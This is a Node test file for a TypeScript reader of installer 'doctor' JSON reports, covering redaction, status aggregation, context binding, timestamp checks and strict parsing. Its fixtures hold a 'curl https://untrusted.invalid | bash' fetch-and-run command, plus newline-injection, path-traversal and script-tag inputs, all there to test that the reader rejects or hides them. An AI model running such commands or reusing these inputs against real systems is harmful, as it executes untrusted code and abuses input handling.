/** Native Blob/WebCrypto tests of the actual reader; no report-validator doubles. */
import { strict as assert } from 'node:assert';
import { createHash, webcrypto } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { test } from 'node:test';
import { runInNewContext } from 'node:vm';

const require = createRequire(import.meta.url);
const ts = require('typescript');
const source = readFileSync(new URL('./doctorReport.ts', import.meta.url), 'utf8');
function api(crypto = webcrypto) {
  const compiled = ts.transpileModule(source, { reportDiagnostics: true,
    compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } });
  assert.deepEqual((compiled.diagnostics ?? []).filter((item) => item.category === ts.DiagnosticCategory.Error), []);
  const module = { exports: {} };
  runInNewContext(compiled.outputText, { module, exports: module.exports, TextDecoder, crypto }, { timeout: 5000 });
  return module.exports;
}
const reader = api();
const NOW = Date.parse('2026-09-18T12:00:00Z');
const plain = (value) => JSON.parse(JSON.stringify(value));
const hash = (bytes) => createHash('sha256').update(bytes).digest('hex');
function context() {
  return { host: '203.0.113.7', username: 'developer', mode: 'safe',
    installerCommand: 'trusted-install --only agents.claude --mode safe',
    manifestSha256: 'a'.repeat(64), checksumsYamlSha256: 'b'.repeat(64),
    selectedModuleIds: ['lang.bun', 'agents.claude'],
    knownModuleIds: ['lang.bun', 'agents.claude', 'agents.codex', 'cli.modern', 'shell.omz'] };
}
function check(id, status = 'pass', extra = {}) {
  return { id, status, label: 'Untrusted label', details: '/home/PRIVATE 203.0.113.99 SECRET',
    fix: 'curl https://untrusted.invalid | bash', ...extra };
}
function report(checks = [check('tool.bun'), check('agent.claude')]) {
  const summary = { pass: 0, skip: 0, warn: 0, fail: 0 };
  for (const check of checks) summary[check.status === 'timeout' ? 'warn' : check.status]++;
  return { acfs_version: '0.9.0', timestamp: '2026-09-18T12:00:00+00:00', mode: 'safe', deep_mode: false,
    user: 'developer', os: { id: 'ubuntu', version: '26.04' }, checks, summary };
}
const read = (value, current = context(), now = NOW) => reader.reviewDoctorReportFile(new Blob([JSON.stringify(value)]), current, now);
const rejectCode = (code) => (error) => error instanceof reader.DoctorReportError && error.code === code;

test('reads the production doctor JSON shape and binds the exact bytes without certifying a host', async () => {
  const current = context(); const text = JSON.stringify(report(), null, 2);
  const value = await reader.reviewDoctorReportFile(new Blob([text]), current, NOW);
  assert.equal(value.sourceSha256, hash(text)); assert.equal(value.sourceBytes, Buffer.byteLength(text));
  assert.equal(value.reportedAt, '2026-09-18T12:00:00.000Z');
  assert.deepEqual(plain(value.modules.map((row) => [row.id, row.status, row.checkCount])),
    [['lang.bun', 'pass', 1], ['agents.claude', 'pass', 1]]);
  assert.equal(value.userMatches, true); assert.equal(value.modeMatches, true);
  assert.equal(value.hostVerified, false); assert.equal(value.installationVerified, false);
  assert.equal(value.needsAttention, false); assert.equal(reader.doctorReportMatches(value, current), true);
});

test('does not expose report labels, details, fixes, usernames, unknown IDs or context values', async () => {
  const input = report([check('tool.bun'), check('private_secret_identifier', 'fail')]);
  input.user = 'PRIVATE_ACCOUNT'; input.extensions = { credentials: 'SECRET_VALUE' };
  const value = await read(input); const publicText = JSON.stringify(value);
  for (const privateValue of ['PRIVATE', 'SECRET', 'private_secret_identifier', '203.0.113',
    'untrusted.invalid', 'trusted-install', 'Untrusted label', 'credentials']) assert.ok(!publicText.includes(privateValue));
  assert.equal(value.userMatches, false); assert.equal(value.unmapped.fail, 1); assert.equal(value.needsAttention, true);
});

test('aggregates multiple generated checks conservatively and preserves missing coverage', async () => {
  const input = report([check('lang.bun.1'), check('lang.bun.2', 'fail'), check('lang.bun.3', 'skip')]);
  const first = await read(input); input.checks.reverse(); const second = await read(input);
  assert.deepEqual(plain(first.modules), plain(second.modules));
  assert.equal(first.modules[0].status, 'fail'); assert.equal(first.modules[0].checkCount, 3);
  assert.equal(first.modules[1].status, 'unreported'); assert.equal(first.modules[1].checkCount, 0);
  assert.equal(first.needsAttention, true);
});

for (const [statuses, expected] of [
  [['pass'], 'pass'], [['skip', 'pass'], 'skip'], [['warn', 'skip', 'pass'], 'warn'],
  [['timeout', 'warn', 'pass'], 'timeout'], [['fail', 'timeout', 'warn', 'skip', 'pass'], 'fail'],
]) {
  test(`module status uses the worst reported result: ${statuses.join(',')}`, async () => {
    const value = await read(report(statuses.map((status, index) => check(`lang.bun.${index + 1}`, status))));
    assert.equal(value.modules[0].status, expected);
  });
}

test('counts timeouts separately but validates their WARN tally in the producer summary', async () => {
  const value = await read(report([check('tool.bun', 'timeout'), check('agent.claude', 'warn')]));
  assert.equal(value.totals.timeout, 1); assert.equal(value.totals.warn, 1);
  const invalid = report([check('tool.bun', 'timeout')]); invalid.summary.warn = 0;
  await assert.rejects(read(invalid), rejectCode('doctor_report_inconsistent'));
});

test('does not hide failures outside selection or invent ownership from a suggested fix', async () => {
  const value = await read(report([check('tool.bun'), check('agent.claude'), check('agent.codex', 'fail'),
    check('unknown.check', 'fail', { fix: 'install --only lang.bun' }), check('lang.bun.0', 'warn')]));
  assert.equal(value.outsideSelection.fail, 1); assert.equal(value.unmapped.fail, 1); assert.equal(value.unmapped.warn, 1);
  assert.equal(value.modules[0].status, 'pass'); assert.equal(value.needsAttention, true);
});

test('requires alias destinations to exist in the current catalogue', async () => {
  const current = context(); current.knownModuleIds = ['agents.claude']; current.selectedModuleIds = ['agents.claude'];
  const value = await read(report([check('tool.bun'), check('agent.claude')]), current);
  assert.equal(value.unmapped.pass, 1); assert.equal(value.outsideSelection.pass, 0);
});

test('maps the published CLI, language, agent and shell aliases without fuzzy inference', async () => {
  const aliases = { 'tool.bun': 'lang.bun', 'tool.uv': 'lang.uv', 'tool.cargo': 'lang.rust', 'tool.go': 'lang.go',
    'tool.tmux': 'cli.modern', 'tool.rg': 'cli.modern', 'tool.gh': 'cli.modern', 'tool.git_lfs': 'cli.modern',
    'tool.rsync': 'cli.modern', 'tool.strace': 'cli.modern', 'tool.lsof': 'cli.modern', 'tool.dig': 'cli.modern',
    'tool.nc': 'cli.modern', 'shell.fzf': 'cli.modern', 'shell.direnv': 'cli.modern',
    'agent.claude': 'agents.claude', 'agent.codex': 'agents.codex', 'agent.antigravity': 'agents.antigravity',
    'shell.ohmyzsh': 'shell.omz', 'shell.p10k': 'shell.p10k' };
  const current = context(); current.knownModuleIds = [...new Set(Object.values(aliases))];
  current.selectedModuleIds = [...current.knownModuleIds];
  const value = await read(report(Object.keys(aliases).map((id) => check(id))), current);
  assert.equal(value.unmapped.pass, 0); assert.equal(value.outsideSelection.pass, 0);
  for (const row of value.modules) assert.equal(row.checkCount, Object.values(aliases).filter((id) => id === row.id).length);
});

for (const field of ['host', 'username', 'mode', 'installerCommand', 'manifestSha256', 'checksumsYamlSha256',
  'selectedModuleIds', 'knownModuleIds']) {
  test(`a changed ${field} invalidates the retained review`, async () => {
    const current = context(); const value = await read(report(), current);
    if (field === 'selectedModuleIds') current[field] = ['agents.codex'];
    else if (field === 'knownModuleIds') current[field].push('lang.uv');
    else if (field.endsWith('Sha256')) current[field] = 'c'.repeat(64);
    else if (field === 'mode') current[field] = 'vibe';
    else current[field] += '-different';
    assert.equal(reader.doctorReportMatches(value, current), false);
  });
}

test('equivalent context enumeration matches but copied/deserialized review objects do not', async () => {
  const current = context(); const value = await read(report(), current);
  current.selectedModuleIds.reverse(); current.knownModuleIds.reverse();
  assert.equal(reader.doctorReportMatches(value, current), true);
  assert.equal(reader.doctorReportMatches(plain(value), current), false);
  assert.equal(reader.doctorReportMatches(null, current), false);
  assert.equal(reader.doctorReportMatches(value, null), false);
});

test('retains the original context snapshot through a delayed Blob read', async () => {
  const current = context(); const original = structuredClone(current); const bytes = Buffer.from(JSON.stringify(report()));
  let release; const barrier = new Promise((resolve) => { release = resolve; });
  const operation = reader.reviewDoctorReportFile({ size: bytes.length,
    slice() { return { async arrayBuffer() { await barrier; return bytes; } }; } }, current, NOW);
  current.username = 'other'; current.selectedModuleIds.push('agents.codex'); release();
  const value = await operation;
  assert.equal(value.userMatches, true); assert.equal(value.modules.length, 2);
  assert.equal(reader.doctorReportMatches(value, current), false); assert.equal(reader.doctorReportMatches(value, original), true);
});

test('freezes the public result without mutating or freezing caller data', async () => {
  const current = context(); const input = report(); const before = JSON.stringify([input, current]);
  const value = await read(input, current);
  assert.equal(JSON.stringify([input, current]), before); assert.equal(Object.isFrozen(current), false);
  assert.throws(() => { value.modules[0].counts.fail = 99; }, TypeError);
  assert.throws(() => value.modules.push({}), (error) => error.name === 'TypeError');
  assert.throws(() => { value.reportedOS.id = 'other'; }, TypeError);
});

for (const [timestamp, expected] of [
  ['2026-09-18T08:00:00-04:00', 'recent'], ['2026-09-18T17:30:00+05:30', 'recent'],
  ['2026-09-17T12:00:00Z', 'recent'], ['2026-09-17T11:59:59Z', 'stale'],
  ['2026-09-18T12:05:00Z', 'recent'], ['2026-09-18T12:05:00.001Z', 'future'],
]) {
  test(`handles timestamp freshness and offset: ${timestamp}`, async () => {
    const input = report(); input.timestamp = timestamp; const value = await read(input);
    assert.equal(value.freshnessAtRead, expected); assert.equal(value.needsAttention, expected !== 'recent');
  });
}
for (const timestamp of ['2026-02-30T12:00:00Z', '2026-13-01T00:00:00Z', '2026-09-18T24:00:00Z',
  '2026-09-18', '2026-09-18T12:00:00', '2026-09-18T12:00:00+24:00', 'PRIVATE', null]) {
  test(`rejects invalid report timestamp ${timestamp}`, async () => {
    const input = report(); input.timestamp = timestamp;
    await assert.rejects(read(input), rejectCode('doctor_report_invalid'));
  });
}

for (const mutate of [
  (value) => { value.mode = 'vibe'; }, (value) => { value.user = 'other-account'; },
]) {
  test(`account/mode mismatches remain visible and cannot claim a matching installation: ${mutate}`, async () => {
    const input = report(); mutate(input); const value = await read(input);
    assert.equal(value.needsAttention, true); assert.equal(value.userMatches && value.modeMatches, false);
    assert.equal(value.installationVerified, false);
  });
}

test('requires every producer field and rejects invalid check and summary shapes', async () => {
  for (const key of Object.keys(report())) {
    const input = report(); delete input[key]; await assert.rejects(read(input), reader.DoctorReportError, key);
  }
  for (const mutation of [{ checks: [] }, { checks: {} }, { summary: [] }, { deep_mode: 'false' },
    { os: { id: '<script>', version: '26.04' } }, { os: { id: 'ubuntu', version: 'secretvalue' } }, { mode: 'unknown' }]) {
    await assert.rejects(read({ ...report(), ...mutation }), reader.DoctorReportError);
  }
  for (const field of ['id', 'status', 'label', 'details', 'fix']) {
    const input = report(); delete input.checks[0][field]; await assert.rejects(read(input), reader.DoctorReportError);
  }
  for (const mutation of [{ id: 'PRIVATE/../../x' }, { id: 'x'.repeat(201) }, { status: 'success' },
    { fix: {} }, { details: false }, { label: null }]) {
    const input = report(); Object.assign(input.checks[0], mutation); await assert.rejects(read(input), reader.DoctorReportError);
  }
  for (const count of [-1, 1.5, '2', null, 99]) {
    const input = report(); input.summary.pass = count;
    await assert.rejects(read(input), rejectCode('doctor_report_inconsistent'));
  }
});

test('refuses duplicate check identities rather than allowing a pass to mask a failure', async () => {
  await assert.rejects(read(report([check('tool.bun', 'fail'), check('tool.bun', 'pass')])), /duplicate identity/);
});

for (const text of ['{"status":"fail","status":"pass"}', '{"status":"fail","stat\\u0075s":"pass"}',
  '{"nested":[{"x":1,"x":2}]}', '{"number":1e400}', '\ufeff{}', 'not JSON', '[]']) {
  test(`rejects ambiguous JSON ${JSON.stringify(text)}`, async () => {
    await assert.rejects(reader.reviewDoctorReportFile(new Blob([text]), context(), NOW), reader.DoctorReportError);
  });
}

test('enforces UTF-8, depth, node, check-count and byte budgets', async () => {
  for (const bytes of [Buffer.from([0xff, 0xfe]), Buffer.from('['.repeat(34) + '0' + ']'.repeat(34)),
    Buffer.from(JSON.stringify(Array(100_001).fill(0))), Buffer.alloc(reader.DOCTOR_REPORT_MAX_BYTES + 1)]) {
    await assert.rejects(reader.reviewDoctorReportFile(new Blob([bytes]), context(), NOW), reader.DoctorReportError);
  }
  await assert.rejects(read(report(Array.from({ length: 4097 }, (_, index) => check(`extra.${index}`)))), /shape/);
});

test('does not read files before validating context and the declared file size', async () => {
  let reads = 0; const file = { size: 100, slice() { reads++; throw new Error('PRIVATE_FILENAME'); } };
  for (const mutation of [{ host: '' }, { username: 'root\nattack' }, { manifestSha256: '' },
    { installerCommand: '' }, { selectedModuleIds: [] }, { selectedModuleIds: ['unknown.module'] },
    { selectedModuleIds: ['lang.bun', 'lang.bun'] }, { selectedModuleIds: [null] },
    { selectedModuleIds: new Array(1) }, { knownModuleIds: ['lang.bun', 'lang.bun'] }]) {
    await assert.rejects(reader.reviewDoctorReportFile(file, { ...context(), ...mutation }, NOW), rejectCode('doctor_context_invalid'));
  }
  for (const size of [0, -1, 1.5, reader.DOCTOR_REPORT_MAX_BYTES + 1]) {
    await assert.rejects(reader.reviewDoctorReportFile({ ...file, size }, context(), NOW), reader.DoctorReportError);
  }
  assert.equal(reads, 0);
});

test('refuses truncated, changed and unreadable file snapshots with redacted errors', async () => {
  for (const file of [
    { size: 2, slice() { return { async arrayBuffer() { return Buffer.from('{}\n'); } }; } },
    { size: 2, slice() { throw new Error('PRIVATE_FILENAME'); } },
    { size: 2, slice() { return { async arrayBuffer() { throw new Error('PRIVATE_ACCOUNT'); } }; } },
  ]) {
    await assert.rejects(reader.reviewDoctorReportFile(file, context(), NOW), (error) => {
      assert.ok(error instanceof reader.DoctorReportError); assert.ok(!error.message.includes('PRIVATE')); return true;
    });
  }
});

test('secure hashing failure has no weaker fallback or raw-data diagnostics', async () => {
  for (const crypto of [null, { subtle: { async digest() { throw new Error('PRIVATE_KEY'); } } }]) {
    const broken = api(crypto);
    await assert.rejects(broken.reviewDoctorReportFile(new Blob([JSON.stringify(report())]), context(), NOW), (error) =>
      error.code === 'doctor_report_hash_unavailable' && !error.message.includes('PRIVATE'));
  }
});

test('handles escaped JSON strings, Unicode labels and extra metadata without interpreting them', async () => {
  const input = report(); input.checks[0].label = 'A "quoted" \\ string {[,]} café';
  input.metadata = { '\\"': '{[]}', '\u0061': 1 }; const value = await read(input);
  assert.equal(value.totals.pass, 2); assert.equal(value.modules[0].status, 'pass');
});
